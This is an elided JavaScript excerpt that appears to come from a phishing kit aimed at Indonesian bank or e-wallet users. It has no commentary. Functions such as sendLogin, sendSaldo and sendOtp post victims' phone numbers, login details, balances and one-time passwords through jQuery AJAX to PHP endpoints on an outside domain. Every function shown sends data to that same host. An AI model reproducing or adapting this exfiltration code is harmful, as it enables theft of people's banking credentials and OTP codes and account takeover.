function sendHp() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12x/otpblm.php',
      type: 'POST',
